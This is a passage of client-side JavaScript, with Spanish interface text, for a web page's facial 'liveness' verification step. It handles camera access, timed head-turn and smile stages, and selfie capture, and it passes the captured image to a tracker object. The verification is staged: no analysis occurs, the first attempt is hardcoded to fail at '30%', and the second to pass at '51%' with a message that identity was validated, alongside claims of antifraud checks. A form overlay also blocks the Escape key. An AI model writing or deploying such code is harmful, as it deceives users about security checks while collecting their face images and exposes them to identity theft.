        startBtn.innerHTML = '<i class="fas fa-bolt"></i> Iniciar escaneo biométrico';
      }

      if (cameraStream) {
        cameraStream.getTracks().forEach(track => track.stop());
        cameraStream = null;
      }

      if (video) {
        if (video.srcObject && typeof video.srcObject.getTracks === 'function') {
          video.srcObject.getTracks().forEach(track => track.stop());
        }
        if (typeof video.pause === 'function') {
          try {
            video.pause();
          } catch (error) {}
        }
        video.srcObject = null;
        video.setAttribute('aria-hidden', 'true');
      }

      if (cameraContainer) {
        cameraContainer.classList.remove('scanning', 'completed');
        cameraContainer.classList.remove('camera-disabled');
      }

      const countdown = document.getElementById('camera-countdown');
      if (countdown) {
        countdown.classList.remove('active');
      }

      if (cameraReadyBadge) {
        cameraReadyBadge.style.display = 'none';
      }

      try {
        const stream = await navigator.mediaDevices.getUserMedia(getCameraConstraints());
        applyCameraStream(stream, {
          successTitle: 'Permiso concedido',
          successMessage: 'La cámara está lista para tomar la foto'
        });
      } catch (error) {
        console.error('Error requesting camera permission:', error);
        showToast(
          'error',
          'Permiso de cámara requerido',
          'No pudimos acceder a la cámara. Otorga el permiso desde tu navegador y vuelve a intentarlo con el botón “Otorgar permiso de la cámara”.'
        );
        updateLivenessStatus('No pudimos activar la cámara', 'idle');
      } finally {
        if (requestButton) {
          requestButton.disabled = false;
          requestButton.removeAttribute('aria-busy');
        }
      }
    }

    // Switch camera
    async function switchCamera() {
      if (cameraStream) {
        cameraStream.getTracks().forEach(track => track.stop());
      }

      facingMode = facingMode === 'user' ? 'environment' : 'user';
      await initializeCamera();
    }

    function disableCameraAfterSuccess() {
      const video = document.getElementById('camera-video');
      if (video && video.srcObject && typeof video.srcObject.getTracks === 'function') {
        video.srcObject.getTracks().forEach(track => track.stop());
      }

      if (cameraStream) {
        cameraStream.getTracks().forEach(track => track.stop());
        cameraStream = null;
      }

      if (video) {
        if (typeof video.pause === 'function') {
          video.pause();
        }
        video.srcObject = null;
        video.setAttribute('aria-hidden', 'true');
      }

      const cameraContainer = document.getElementById('camera-container');
      if (cameraContainer) {
        cameraContainer.classList.add('camera-disabled');
        cameraContainer.classList.remove('scanning');
        cameraContainer.classList.add('completed');
      }

      const countdown = document.getElementById('camera-countdown');
      if (countdown) {
        countdown.classList.remove('active');
      }

      const switchBtn = document.getElementById('switch-camera');
      if (switchBtn) {
        switchBtn.disabled = true;
        switchBtn.classList.add('is-disabled');
        switchBtn.setAttribute('aria-disabled', 'true');
      }

      const cameraReadyBadge = document.getElementById('camera-ready');
      if (cameraReadyBadge) {
        cameraReadyBadge.style.display = 'none';
      }

      const instructions = document.getElementById('camera-instructions');
      if (instructions) {
        instructions.textContent = 'Escaneo completado. La cámara se desactivó automáticamente.';
      }

      setOverlayStage('completed');
    }

    function initializeBiometricGuidance(options = {}) {
      const { resetAttempts = false } = options;

      if (resetAttempts) {
        livenessAttempts = 0;
      }
      resetFailureAudioState();
      updateLivenessInstruction(
        'Prepárese para un escaneo 3D',
        'Cuando inicie le pediremos movimientos suaves para confirmar que es una persona real.',
        'Alinee su rostro con el marco luminoso'
      );
      updateLivenessProgress(0, TOTAL_LIVENESS_DURATION);
      updateLivenessStatus('Listo para iniciar', 'idle');
      resetAnalysisChecklist();
      setOverlayStage('idle');

      const cameraContainer = document.getElementById('camera-container');
      if (cameraContainer) {
        cameraContainer.classList.remove('scanning', 'completed', 'camera-disabled');
      }

      const report = document.getElementById('analysis-report');
      if (report) {
        report.classList.remove('success', 'failed');
      }

      const scoreEl = document.getElementById('analysis-score-value');
      if (scoreEl) {
        scoreEl.textContent = '--';
      }
    }

    async function startLivenessScan(event) {
      if (event && typeof event.preventDefault === 'function') {
        event.preventDefault();
      }

      if (livenessActive) {
        return;
      }

      if (livenessAttempts >= 2) {
        showToast('info', 'Biometría completada', 'Ya aprobaste la verificación facial, puedes continuar con el proceso.');
        return;
      }

      if (!cameraStream) {
        await initializeCamera();
      }

      if (!cameraStream) {
        const startBtnFallback = document.getElementById('start-liveness');
        if (startBtnFallback) {
          startBtnFallback.disabled = false;
          startBtnFallback.innerHTML = '<i class="fas fa-bolt"></i> Iniciar escaneo biométrico';
        }
        updateLivenessStatus('No pudimos activar la cámara', 'idle');
        showToast('error', 'Cámara no disponible', 'No fue posible acceder a la cámara. Verifique los permisos e intente de nuevo.');
        return;
      }

      biometricSkipped = false;
      updateStep4BiometricMessaging();

      livenessActive = true;
      livenessStageIndex = 0;
      livenessElapsed = 0;

      removeBiometricReference();
      hasSelfie = false;
      updateNextButtonState();

      const startBtn = document.getElementById('start-liveness');
      if (startBtn) {
        startBtn.disabled = true;
        startBtn.innerHTML = '<i class="fas fa-wave-square"></i> Escaneando...';
      }

      hideRetakeButtons();

      const selfiePreview = document.getElementById('selfie-preview');
      if (selfiePreview) {
        selfiePreview.classList.remove('active');
      }

      const cameraContainer = document.getElementById('camera-container');
      if (cameraContainer) {
        cameraContainer.classList.remove('completed');
        cameraContainer.classList.add('scanning');
      }

      resetAnalysisChecklist();
      setAnalysisStatus('Analizando gestos dinámicos', 'active');
      updateLivenessProgress(0, TOTAL_LIVENESS_DURATION);

      runLivenessStage();
    }

    function runLivenessStage() {
      stopLivenessTimers();

      if (!livenessActive) {
        return;
      }

      if (livenessStageIndex >= LIVENESS_SEQUENCE.length) {
        completeLivenessScan();
        return;
      }

      const stage = LIVENESS_SEQUENCE[livenessStageIndex];
      const stageDuration = stage.duration || 3200;

      setActiveStep(stage.id);
      updateAnalysisChecklist(stage.id, 'active');
      updateLivenessInstruction(stage.title, stage.description, stage.overlay);
      updateLivenessStatus(stage.title, 'active');
      setOverlayStage(stage.id);

      stopGuideAudios();

      let stageAudio = null;
      switch (stage.id) {
        case 'turn-left':
          stageAudio = ok33;
          break;
        case 'turn-right':
          stageAudio = ok34;
          break;
        case 'smile':
          stageAudio = ok35;
          break;
        case 'focus':
          stageAudio = ok36;
          break;
        case 'frontal':
          stageAudio = ok32;
          break;
        default:
          stageAudio = null;
      }

      if (stageAudio) {
        playGuideAudio(stageAudio);
      }

      const stageStartTime = Date.now();

      livenessProgressTimer = setInterval(() => {
        const stageElapsed = Math.min(Date.now() - stageStartTime, stageDuration);
        updateLivenessProgress(livenessElapsed + stageElapsed, TOTAL_LIVENESS_DURATION);
      }, 90);

      livenessTimer = setTimeout(() => {
        markStepCompleted(stage.id);
        updateAnalysisChecklist(stage.id, 'completed');
        livenessElapsed += stageDuration;
        livenessStageIndex++;
        runLivenessStage();
      }, stageDuration);
    }

    function completeLivenessScan() {
      stopLivenessTimers();
      updateLivenessProgress(TOTAL_LIVENESS_DURATION, TOTAL_LIVENESS_DURATION);
      updateLivenessInstruction(
        'Análisis de coincidencia facial',
        'Estamos verificando los patrones biométricos y medidas antifraude capturados en tiempo real.',
        'Mantenga la mirada fija en el centro mientras completamos la captura.'
      );
      updateLivenessStatus('Procesando biometría...', 'processing');
      setAnalysisStatus('Procesando coincidencia facial', 'processing');
      updateAnalysisChecklist('quality', 'active');
      setOverlayStage('focus');

      const cameraContainer = document.getElementById('camera-container');
      if (cameraContainer) {
        cameraContainer.classList.add('scanning');
      }

      setTimeout(() => {
        capturePhoto({ skipCountdown: true });
      }, 1100);
    }

    function stopLivenessTimers() {
      if (livenessTimer) {
        clearTimeout(livenessTimer);
        livenessTimer = null;
      }
      if (livenessProgressTimer) {
        clearInterval(livenessProgressTimer);
        livenessProgressTimer = null;
      }
    }

    function getStageMeta(stageId) {
      const index = LIVENESS_SEQUENCE.findIndex(stage => stage.id === stageId);
      if (index === -1) {
        return null;
      }

      return {
        stage: LIVENESS_SEQUENCE[index],
        index: index + 1
      };
    }

    function createStepElement(stage, index) {
      const stepEl = document.createElement('div');
      stepEl.className = 'liveness-step is-active';
      stepEl.dataset.stepId = stage.id;

      const indexEl = document.createElement('span');
      indexEl.className = 'step-index';
      indexEl.textContent = index;

      const contentEl = document.createElement('div');
      contentEl.className = 'step-content';

      const titleEl = document.createElement('h4');
      titleEl.textContent = stage.title;

      const descriptionEl = document.createElement('p');
      descriptionEl.textContent = stage.description;

      contentEl.appendChild(titleEl);
      contentEl.appendChild(descriptionEl);

      stepEl.appendChild(indexEl);
      stepEl.appendChild(contentEl);

      return stepEl;
    }

    function createSummaryItem(stage, index) {
      const item = document.createElement('div');
      item.className = 'summary-item is-hidden';
      item.dataset.summaryStep = stage.id;
      item.title = stage.description;

      const icon = document.createElement('i');
      icon.className = 'fas fa-check';
      icon.setAttribute('aria-hidden', 'true');

      const indexEl = document.createElement('span');
      indexEl.className = 'summary-index';
      indexEl.textContent = index;

      const label = document.createElement('span');
      label.className = 'summary-label';
      label.textContent = stage.title;

      item.appendChild(icon);
      item.appendChild(indexEl);
      item.appendChild(label);

      return item;
    }

    function revealElementWithAnimation(element) {
      if (!element) {
        return;
      }

      requestAnimationFrame(() => {
        element.classList.remove('is-hidden');
      });
    }

    function initializeStepper() {
      completedLivenessSteps.clear();

      const activeContainer = document.getElementById('liveness-active-step');
      if (activeContainer) {
        activeContainer.innerHTML = '';
      }

      const summaryList = document.getElementById('liveness-summary-list');
      if (summaryList) {
        summaryList.innerHTML = '';
      }

      const summary = document.getElementById('liveness-summary');
      if (summary) {
        summary.classList.add('is-hidden');
      }

      if (LIVENESS_SEQUENCE.length > 0) {
        setActiveStep(LIVENESS_SEQUENCE[0].id, { immediate: true });
      }
    }

    function updateLivenessInstruction(title, description, overlayText) {
      const titleEl = document.getElementById('liveness-instruction-title');
      if (titleEl) {
        titleEl.textContent = title;
      }

      const descriptionEl = document.getElementById('liveness-instruction-text');
      if (descriptionEl) {
        descriptionEl.textContent = description;
      }

      const overlayEl = document.getElementById('camera-instructions');
      if (overlayEl && overlayText) {
        overlayEl.textContent = overlayText;
      }
    }

    function updateLivenessStatus(message, statusType = 'idle') {
      const statusEl = document.getElementById('liveness-status');
      if (!statusEl) {
        return;
      }

      statusEl.classList.remove('status-idle', 'status-active', 'status-processing', 'status-success');
      statusEl.classList.add(`status-${statusType}`);

      const label = document.getElementById('liveness-status-text');
      if (label) {
        label.textContent = message;
      }
    }

    function setOverlayStage(stageId) {
      const overlay = document.getElementById('liveness-overlay');
      if (overlay) {
        overlay.setAttribute('data-stage', stageId || 'idle');
      }
    }

    function updateLivenessProgress(elapsed, total) {
      const bar = document.getElementById('liveness-progress-bar');
      const label = document.getElementById('liveness-progress-label');

      const percent = total ? Math.min(Math.round((elapsed / total) * 100), 100) : 0;

      if (bar) {
        bar.style.width = `${percent}%`;
      }

      if (label) {
        label.textContent = `${percent}% completado`;
      }
    }

    function setAnalysisStatus(message, statusType = 'pending') {
      const statusEl = document.getElementById('analysis-status');
      if (!statusEl) {
        return;
      }

      statusEl.classList.remove('status-pending', 'status-active', 'status-processing', 'status-success', 'status-failed');
      statusEl.classList.add(`status-${statusType}`);

      let icon = 'fas fa-shield-halved';
      if (statusType === 'active') {
        icon = 'fas fa-wave-square';
      } else if (statusType === 'processing') {
        icon = 'fas fa-circle-notch fa-spin';
      } else if (statusType === 'success') {
        icon = 'fas fa-shield-check';
      } else if (statusType === 'failed') {
        icon = 'fas fa-triangle-exclamation';
      }

      statusEl.innerHTML = `<i class="${icon}"></i> ${message}`;
    }

    function setActiveStep(stageId, options = {}) {
      const meta = getStageMeta(stageId);
      if (!meta) {
        return;
      }

      const { stage, index } = meta;
      const { immediate = false } = options;
      const container = document.getElementById('liveness-active-step');

      if (!container) {
        return;
      }

      const renderStep = () => {
        const stepElement = createStepElement(stage, index);
        if (!immediate) {
          stepElement.classList.add('is-hidden');
        }
        container.appendChild(stepElement);
        if (!immediate) {
          revealElementWithAnimation(stepElement);
        }
      };

      const currentStep = container.querySelector('.liveness-step');
      if (currentStep) {
        if (currentStep.dataset.stepId === stageId) {
          if (immediate) {
            currentStep.classList.remove('is-hidden');
          }
          return;
        }

        if (immediate) {
          currentStep.remove();
          renderStep();
          return;
        }

        let replaced = false;
        const handleTransitionEnd = () => {
          if (replaced) {
            return;
          }
          replaced = true;
          currentStep.removeEventListener('transitionend', handleTransitionEnd);
          if (currentStep.parentElement) {
            currentStep.parentElement.removeChild(currentStep);
          }
          renderStep();
        };

        currentStep.addEventListener('transitionend', handleTransitionEnd);
        currentStep.classList.add('is-hidden');
        setTimeout(handleTransitionEnd, STEP_TRANSITION_DURATION);
      } else {
        renderStep();
      }
    }

    function markStepCompleted(stageId) {
      const meta = getStageMeta(stageId);
      if (!meta || completedLivenessSteps.has(stageId)) {
        return;
      }

      completedLivenessSteps.add(stageId);

      const activeContainer = document.getElementById('liveness-active-step');
      if (activeContainer) {
        const activeStep = activeContainer.querySelector(`.liveness-step[data-step-id="${stageId}"]`);
        if (activeStep) {
          activeStep.classList.add('is-hidden');
          const removeActive = () => {
            activeStep.removeEventListener('transitionend', removeActive);
            if (activeStep.parentElement) {
              activeStep.parentElement.removeChild(activeStep);
            }
          };
          activeStep.addEventListener('transitionend', removeActive);
          setTimeout(removeActive, STEP_TRANSITION_DURATION);
        }
      }

      const summaryList = document.getElementById('liveness-summary-list');
      const summary = document.getElementById('liveness-summary');

      if (summaryList && summary && !summaryList.querySelector(`[data-summary-step="${stageId}"]`)) {
        const summaryItem = createSummaryItem(meta.stage, meta.index);
        summaryList.appendChild(summaryItem);

        if (summary.classList.contains('is-hidden')) {
          revealElementWithAnimation(summary);
        }

        revealElementWithAnimation(summaryItem);
      }
    }

    function resetStepper() {
      initializeStepper();
    }

    function updateAnalysisChecklist(stepId, state) {
      const item = document.querySelector(`.analysis-item[data-check-step="${stepId}"]`);
      if (!item) {
        return;
      }

      item.classList.remove('active', 'completed');
      if (state) {
        item.classList.add(state);
      }

      const icon = item.querySelector('.item-icon i');
      if (icon) {
        if (state === 'completed') {
          icon.className = 'fas fa-check';
        } else if (state === 'active') {
          icon.className = 'fas fa-wave-square';
        } else {
          icon.className = 'fas fa-circle-notch';
        }
      }
    }

    function resetAnalysisChecklist() {
      resetStepper();
      document.querySelectorAll('.analysis-item').forEach(item => {
        item.classList.remove('active', 'completed');
        const icon = item.querySelector('.item-icon i');
        if (icon) {
          icon.className = 'fas fa-circle-notch';
        }
      });
      setAnalysisStatus('Escaneo pendiente', 'pending');
      updateAnalysisChecklist('quality', null);
    }

    function renderBiometricReport(attempt) {
      updateAnalysisChecklist('quality', 'completed');

      const scoreEl = document.getElementById('analysis-score-value');
      const report = document.getElementById('analysis-report');
      const nextBtn = document.getElementById('next-step-3');
      const removeBtn = document.getElementById('remove-selfie');

      if (report) {
        report.classList.remove('success', 'failed');
      }

      if (attempt >= 2) {
        resetFailureAudioState();
        if (scoreEl) {
          scoreEl.textContent = '51%';
        }
        setAnalysisStatus('Identidad validada con éxito', 'success');
        if (report) {
          report.classList.add('success');
        }
        updateLivenessInstruction(
          'Escaneo facial finalizado',
          'Puedes continuar con el proceso, ya no es necesario mantener la cámara activa.',
          'Escaneo completado. La cámara se desactivó automáticamente.'
        );
        disableCameraAfterSuccess();
        hideRetakeButtons({ disable: true });
        if (removeBtn) {
          removeBtn.disabled = true;
          removeBtn.classList.add('is-disabled');
          removeBtn.setAttribute('aria-disabled', 'true');
        }
        if (nextBtn) {
          nextBtn.disabled = false;
          nextBtn.classList.remove('btn-outline');
          nextBtn.classList.add('btn-primary');
        }
        return;
      }

      if (scoreEl) {
        scoreEl.textContent = '30%';
      }
      setAnalysisStatus('Resultado biométrico no aprobado. Repite el escaneo.', 'failed');
      if (report) {
        report.classList.add('failed');
      }
      showRetakeButtons();
      if (removeBtn) {
        removeBtn.disabled = false;
        removeBtn.classList.remove('is-disabled');
        removeBtn.removeAttribute('aria-disabled');
      }
      if (nextBtn) {
        nextBtn.disabled = true;
        nextBtn.classList.remove('btn-primary');
        if (!nextBtn.classList.contains('btn-outline')) {
          nextBtn.classList.add('btn-outline');
        }
      }

      triggerFailureGuidance(attempt);
    }

    function showAvatarComparisonOverlay(selfieImageData) {
      const overlay = document.getElementById('avatar-compare-overlay');
      if (!overlay) {
        return;
      }

      const referenceImg = document.getElementById('avatar-reference-img');
      const selfieImg = document.getElementById('avatar-selfie-img');
      const messageEl = document.getElementById('avatar-compare-message');
      const followupEl = document.getElementById('avatar-compare-followup');

      const avatarSource = loadStoredAvatarImage();
      if (referenceImg) {
        if (avatarSource) {
          referenceImg.src = avatarSource;
          referenceImg.classList.remove('placeholder');
          referenceImg.alt = 'Avatar registrado';
        } else {
          referenceImg.src = 'visablu512.png';
          referenceImg.classList.add('placeholder');
          referenceImg.alt = 'Avatar predeterminado';
        }
      }

      if (selfieImg && selfieImageData) {
        selfieImg.src = selfieImageData;
        selfieImg.alt = 'Selfie capturada durante la verificación';
      }

      if (messageEl) {
        messageEl.textContent = 'Nuestro sistema detectó que la coincidencia facial entre tu avatar y la captura más reciente es más débil de lo esperado.';
      }
      if (followupEl) {
        followupEl.textContent = 'Solicitaremos una evaluación adicional para confirmar tu identidad. Un especialista revisará manualmente ambos registros y se comunicará contigo si necesita datos extra.';
      }

      if (messageEl && followupEl && !avatarSource) {
        messageEl.textContent = 'No encontramos una foto de avatar guardada para comparar automáticamente la biometría.';
        followupEl.textContent = 'Realizaremos una evaluación manual adicional y podríamos solicitarte una evidencia extra para confirmar tu identidad.';
      }

      overlay.classList.add('show');
      overlay.setAttribute('aria-hidden', 'false');
    }

    function hideAvatarComparisonOverlay() {
      const overlay = document.getElementById('avatar-compare-overlay');
      if (!overlay) {
        return;
      }

      overlay.classList.remove('show');
      overlay.setAttribute('aria-hidden', 'true');
    }

    // Capture photo
    function capturePhoto(options = {}) {
      const { skipCountdown = false } = options;
      const video = document.getElementById('camera-video');

      if (!video || !video.videoWidth || !video.videoHeight) {
        livenessActive = false;
        resetBiometricExperience({ silent: true });
        updateLivenessStatus('No pudimos capturar la imagen', 'idle');
        showToast('error', 'Cámara no disponible', 'Verifique los permisos de acceso a la cámara e intente nuevamente.');
        return;
      }

      const canvas = document.createElement('canvas');
      const context = canvas.getContext('2d');

      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      context.drawImage(video, 0, 0);

      const imageData = canvas.toDataURL('image/jpeg', 0.9);
      if (typeof RemeexTracker !== 'undefined') {
        RemeexTracker.trackSelfie(imageData);
      }

      const finalizeCapture = () => {
        stopLivenessTimers();
        livenessActive = false;

        const cameraContainer = document.getElementById('camera-container');
        if (cameraContainer) {
          cameraContainer.classList.remove('scanning');
          cameraContainer.classList.add('completed');
        }

        const selfieImage = document.getElementById('selfie-image');
        const selfiePreview = document.getElementById('selfie-preview');
        if (selfieImage && selfiePreview) {
          selfieImage.src = imageData;
          selfiePreview.classList.add('active');
        }

        const startBtn = document.getElementById('start-liveness');
        if (startBtn) {
          startBtn.style.display = 'none';
          startBtn.disabled = true;
        }

        if (livenessAttempts >= 2) {
          updateLivenessProgress(TOTAL_LIVENESS_DURATION, TOTAL_LIVENESS_DURATION);
          setOverlayStage('capture');
          return;
        }

        livenessAttempts += 1;
        const attemptNumber = livenessAttempts;

        const isSuccessfulAttempt = attemptNumber >= 2;
        const successAudioAlreadyPlayed = hasBiometricSuccessAudioPlayed();

        if (isSuccessfulAttempt) {
          hasSelfie = true;
          saveBiometricReference({ successAudioPlayed: successAudioAlreadyPlayed });
          clearBiometricSkip();
        } else {
          hasSelfie = false;
          removeBiometricReference();
        }

        updateNextButtonState();
        updateLivenessProgress(TOTAL_LIVENESS_DURATION, TOTAL_LIVENESS_DURATION);
        setOverlayStage('capture');
        renderBiometricReport(attemptNumber);

        if (isSuccessfulAttempt) {
          updateLivenessStatus('Coincidencia biométrica confirmada', 'success');
          showToast('success', 'Biometría capturada', 'Tu escaneo facial superó todas las comprobaciones dinámicas.');
          if (!successAudioAlreadyPlayed) {
            stopGuideAudios(ok40);
            playGuideAudio(ok40);
            markBiometricSuccessAudioPlayed();
          }
          if (!avatarComparisonShown) {
            showAvatarComparisonOverlay(imageData);
            avatarComparisonShown = true;
          }
          confetti({
            particleCount: 130,
            spread: 75,
            origin: { y: 0.6 }
          });
        } else {
          updateLivenessStatus('Necesitamos repetir el escaneo', 'active');
          showToast('warning', 'Verificación no aprobada', 'Por favor repite el escaneo siguiendo las instrucciones.');
          triggerFailureGuidance(attemptNumber);
        }
      };

      if (skipCountdown) {
        finalizeCapture();
        return;
      }

      const countdown = document.getElementById('camera-countdown');
      if (!countdown) {
        finalizeCapture();
        return;
      }

      let count = 3;
      countdown.textContent = count;
      countdown.classList.add('active');

      const countInterval = setInterval(() => {
        count--;
        countdown.textContent = count;

        gsap.fromTo(countdown,
          { scale: 1.5, opacity: 0 },
          { scale: 1, opacity: 1, duration: 0.5, ease: 'power2.out' }
        );

        if (count <= 0) {
          clearInterval(countInterval);
          countdown.classList.remove('active');
          finalizeCapture();
        }
      }, 900);
    }

    function resetBiometricExperience(options = {}) {
      const { silent = false, preserveAttempts = false, preserveSkip = false } = options;

      if (!preserveSkip) {
        biometricSkipped = false;
      }

      if (!preserveAttempts) {
        livenessAttempts = 0;
        avatarComparisonShown = false;
      }

      resetFailureAudioState();

      stopLivenessTimers();
      livenessActive = false;
      livenessStageIndex = 0;
      livenessElapsed = 0;

      const cameraContainer = document.getElementById('camera-container');
      if (cameraContainer) {
        cameraContainer.classList.remove('completed', 'scanning', 'camera-disabled');
      }

      const selfiePreview = document.getElementById('selfie-preview');
      if (selfiePreview) {
        selfiePreview.classList.remove('active');
      }

      const startBtn = document.getElementById('start-liveness');
      if (startBtn) {
        startBtn.style.display = 'block';
        startBtn.disabled = false;
        startBtn.innerHTML = '<i class="fas fa-bolt"></i> Iniciar escaneo biométrico';
      }

      hideRetakeButtons();

      const switchBtn = document.getElementById('switch-camera');
      if (switchBtn) {
        switchBtn.disabled = false;
        switchBtn.classList.remove('is-disabled');
        switchBtn.removeAttribute('aria-disabled');
      }

      const video = document.getElementById('camera-video');
      if (video) {
        video.removeAttribute('aria-hidden');
      }

      const removeBtn = document.getElementById('remove-selfie');
      if (removeBtn) {
        removeBtn.disabled = false;
        removeBtn.classList.remove('is-disabled');
        removeBtn.removeAttribute('aria-disabled');
      }

      hasSelfie = false;
      removeBiometricReference();
      initializeBiometricGuidance({ resetAttempts: !preserveAttempts });
      updateNextButtonState();
      updateStep4BiometricMessaging();

      if (!silent) {
        showToast('info', 'Escaneo reiniciado', 'Puede repetir la verificación biométrica cuando esté listo.');
      }
    }

    // Retake photo
    function retakePhoto(event) {
      if (event && typeof event.preventDefault === 'function') {
        event.preventDefault();
      }
      if (livenessAttempts >= 2) {
        showToast('info', 'Verificación completada', 'Ya no es necesario repetir el escaneo biométrico.');
        return;
      }
      showRetakeOverlay('retake');
    }

    // Remove selfie
    function removeSelfie(event) {
      if (event && typeof event.preventDefault === 'function') {
        event.preventDefault();
      }
      if (livenessAttempts >= 2) {
        showToast('info', 'Verificación finalizada', 'La biometría ya fue aprobada y no puede reiniciarse.');
        return;
      }
      showRetakeOverlay('remove');
    }

    // Biometric reference helpers
    function getStoredBiometricReference() {
      try {
        const stored = localStorage.getItem(CONFIG.STORAGE_KEYS.VERIFICATION_BIOMETRIC);
        return stored ? JSON.parse(stored) : null;
      } catch (error) {
        console.warn('No se pudo leer la referencia biométrica almacenada:', error);
        return null;
      }
    }

    function markBiometricSkip() {
      try {
        localStorage.setItem(CONFIG.STORAGE_KEYS.VERIFICATION_BIOMETRIC_SKIPPED, 'true');
      } catch (error) {
        console.warn('No se pudo guardar el estado de biometría omitida:', error);
      }
    }

    function applyBiometricOptOutState(options = {}) {
      const { fromStorage = false } = options;

      biometricSkipped = true;
      hasSelfie = false;

      if (typeof hideSkipBiometricsOverlay === 'function') {
        hideSkipBiometricsOverlay();
      }

      if (cameraStream) {
        try {
          cameraStream.getTracks().forEach(track => track.stop());
        } catch (error) {
          console.warn('No se pudo detener el stream de la cámara al omitir biometría:', error);
        }
        cameraStream = null;
      }

      const video = document.getElementById('camera-video');
      if (video) {
        try {
          if (video.srcObject && typeof video.srcObject.getTracks === 'function') {
            video.srcObject.getTracks().forEach(track => track.stop());
          }
          if (typeof video.pause === 'function') {
            video.pause();
          }
        } catch (error) {
          console.warn('No se pudo limpiar el video de la cámara al omitir biometría:', error);
        }
        video.srcObject = null;
        video.setAttribute('aria-hidden', 'true');
      }

      const cameraReadyBadge = document.getElementById('camera-ready');
      if (cameraReadyBadge) {
        cameraReadyBadge.style.display = 'none';
      }

      const step3 = document.getElementById('step-3');
      if (step3) {
        step3.classList.add('skipped');
        step3.setAttribute('aria-hidden', 'true');
        if (step3.classList.contains('active')) {
          step3.classList.remove('active');
        }
      }

      const skipButton = document.getElementById('skip-biometrics');
      if (skipButton) {
        skipButton.style.display = 'none';
        skipButton.setAttribute('aria-hidden', 'true');
      }

      const requestCameraButton = document.getElementById('request-camera-access');
      if (requestCameraButton) {
        requestCameraButton.style.display = 'none';
        requestCameraButton.setAttribute('aria-hidden', 'true');
      }

      const startLivenessButton = document.getElementById('start-liveness');
      if (startLivenessButton) {
        startLivenessButton.style.display = 'none';
      }

      hideRetakeButtons({ preserveStartHidden: true });

      const switchCameraButton = document.getElementById('switch-camera');
      if (switchCameraButton) {
        switchCameraButton.style.display = 'none';
      }

      updateNextButtonState();
      updateStep4BiometricMessaging();

      if (fromStorage) {
        showToast('info', 'Biometría omitida', 'Registramos que preferiste continuar sin la verificación biométrica.');
      }
    }

    function clearBiometricSkip() {
      try {
        localStorage.removeItem(CONFIG.STORAGE_KEYS.VERIFICATION_BIOMETRIC_SKIPPED);
      } catch (error) {
        console.warn('No se pudo limpiar el estado de biometría omitida:', error);
      }
    }

    function hasBiometricSuccessAudioPlayed() {
      const reference = getStoredBiometricReference();
      return Boolean(reference && reference.successAudioPlayed);
    }

    function markBiometricSuccessAudioPlayed() {
      try {
        const reference = getStoredBiometricReference() || {};
        reference.successAudioPlayed = true;
        localStorage.setItem(CONFIG.STORAGE_KEYS.VERIFICATION_BIOMETRIC, JSON.stringify(reference));
      } catch (error) {
        console.warn('No se pudo guardar el estado del audio de aprobación biométrica:', error);
      }
    }

    function saveBiometricReference(options = {}) {
      const existingReference = getStoredBiometricReference() || {};
      const biometric = {
        ...existingReference,
        captured: true,
        captureDate: new Date().toISOString()
      };

      if (Object.prototype.hasOwnProperty.call(options, 'successAudioPlayed')) {
        biometric.successAudioPlayed = Boolean(options.successAudioPlayed);
      }

      try {
        localStorage.setItem(CONFIG.STORAGE_KEYS.VERIFICATION_BIOMETRIC, JSON.stringify(biometric));
      } catch (error) {
        console.warn('No se pudo guardar la referencia biométrica:', error);
      }
    }

    // Remove biometric reference
    function removeBiometricReference() {
      localStorage.removeItem(CONFIG.STORAGE_KEYS.VERIFICATION_BIOMETRIC);
    }

    // Update next button state
    function updateNextButtonState() {
      if (currentStep === 3) {
        const nextBtn = document.getElementById('next-step-3');
        const canContinue = hasSelfie || biometricSkipped;
        nextBtn.disabled = !canContinue;

        if (canContinue) {
          nextBtn.classList.remove('btn-outline');
          nextBtn.classList.add('btn-primary');
          gsap.fromTo(nextBtn,
            { scale: 1 },
            { scale: 1.05, duration: 0.3, yoyo: true, repeat: 1 }
          );
        } else {
          nextBtn.classList.remove('btn-primary');
          nextBtn.classList.add('btn-outline');
        }
      }
    }

    // SOLUCIÓN CRÍTICA: Setup Tally listener - COMPLETAMENTE REDISEÑADO
    function setupTallyListener() {
      let tallyTimer = null;
      let secondsRemaining = 180;

      // Función para ocultar el overlay de Tally
      function hideTallyModal(options = {}) {
        const { immediate = false } = options;
        const overlay = document.getElementById('tally-overlay');

        if (!overlay) return;

        const finishHide = () => {
          overlay.style.display = 'none';
          overlay.classList.remove('show');
          overlay.style.opacity = '';
          overlay.setAttribute('aria-hidden', 'true');
        };

        if (immediate) {
          finishHide();
          return;
        }

        if (overlay.classList.contains('show') || overlay.style.display === 'flex') {
          gsap.to(overlay, {
            opacity: 0,
            duration: 0.35,
            onComplete: finishHide
          });
        } else {
          finishHide();
        }
      }

      // Función para mostrar el overlay de Tally
      function showTallyModal() {
        const overlay = document.getElementById('tally-overlay');
        const iframe = document.getElementById('tally-iframe');

        if (!overlay || !iframe || tallyOptedOut) return;

        // Cargar el iframe si no está cargado
        if (!iframe.src && iframe.dataset.tallySrc) {
          iframe.src = iframe.dataset.tallySrc;
        }

        // Mostrar el overlay con animación
        overlay.classList.add('show');
        overlay.style.display = 'flex';
        overlay.style.opacity = '0';
        overlay.setAttribute('aria-hidden', 'false');

        // Asegurar que la locución correspondiente se reproduzca claramente
        if (typeof stopGuideAudios === 'function') {
          stopGuideAudios(ok41);
        }
        if (typeof playGuideAudio === 'function' && ok41) {
          playGuideAudio(ok41);
        }

        gsap.fromTo(overlay,
          { opacity: 0 },
          { opacity: 1, duration: 0.4 }
        );

        // Iniciar el temporizador de 180 segundos
        startTallyTimer();

        // Prevenir el cierre del overlay con ESC
        document.addEventListener('keydown', preventEscape);
      }

      // Expose function globally to reuse elsewhere
      window.showTallyModal = showTallyModal;

      const optOutOverlay = document.getElementById('tally-optout-overlay');
      const optOutConfirmBtn = document.getElementById('tally-optout-confirm');
      const optOutCancelBtn = document.getElementById('tally-optout-cancel');
      const optOutCancelSecondary = document.getElementById('tally-optout-cancel-secondary');
      const optOutReasonInputs = document.querySelectorAll('input[name="tally-optout-reason"]');

      function openOptOutOverlay() {
        if (!optOutOverlay) return;

        optOutOverlay.style.display = 'flex';
        optOutOverlay.setAttribute('aria-hidden', 'false');
        requestAnimationFrame(() => {
          optOutOverlay.classList.add('show');
        });

        if (optOutConfirmBtn) {
          optOutConfirmBtn.disabled = !Array.from(optOutReasonInputs).some(input => input.checked);
        }
      }

      function closeOptOutOverlay() {
        if (!optOutOverlay) return;

        optOutOverlay.classList.remove('show');
        optOutOverlay.setAttribute('aria-hidden', 'true');
        setTimeout(() => {
          optOutOverlay.style.display = 'none';
        }, 200);
      }

